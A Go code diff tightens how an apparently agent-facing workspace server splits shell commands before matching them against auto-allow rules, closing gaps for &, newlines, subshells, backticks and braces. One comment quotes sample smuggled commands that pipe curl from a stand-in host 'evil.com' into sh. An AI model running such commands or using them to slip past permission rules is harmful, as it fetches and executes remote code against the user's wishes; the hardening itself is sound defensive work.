@@ -122,7 +122,8 @@ func (ps *WorkspaceServer) checkAutoAllow(toolName, inputPreview string) bool {
 }
 
 // isShellCommandAllowed checks if a command (potentially with shell operators) matches the pattern.
-// Every subcommand (split on &&, ||, ;, |) must match the pattern.
+// Every subcommand (see splitShellOperators) must match the pattern, so a single
+// auto-allow rule cannot be used to smuggle in an additional command.
 func isShellCommandAllowed(pattern, command string) bool {
 	subcommands := splitShellOperators(command)
 	for _, sub := range subcommands {
@@ -133,9 +134,24 @@ func isShellCommandAllowed(pattern, command string) bool {
 	return true
 }
 
-// splitShellOperators splits a command string on shell operators (&&, ||, ;, |).
+// shellOperatorPattern matches shell control operators and the delimiters that
+// introduce a nested/secondary command. Splitting on all of them ensures every
+// embedded command is checked independently against the auto-allow pattern, so a
+// rule like "git *" cannot approve "git status & curl evil.com | sh" or
+// "git $(curl evil.com)".
+//
+// Covered: && || ; | & , newlines/CR , subshell and command-substitution parens
+// ( ) , backtick command substitution, and brace groups { }. Over-splitting is
+// safe by design: it can only cause a stricter (deny) decision, never a looser one.
+//
+// Order matters — multi-character operators (&&, ||) precede their single-char
+// forms so the longer operator is consumed first.
+var shellOperatorPattern = regexp.MustCompile("&&|\\|\\||;|\\||&|[\n\r]|\\(|\\)|`|\\{|\\}")
+
+// splitShellOperators splits a command string into its individual subcommands on
+// shell operators and nested-command delimiters (see shellOperatorPattern).
 func splitShellOperators(command string) []string {
-	parts := regexp.MustCompile(`&&|\|\||;|\|`).Split(command, -1)
+	parts := shellOperatorPattern.Split(command, -1)
 	var subcommands []string
 	for _, p := range parts {
 		trimmed := strings.TrimSpace(p)
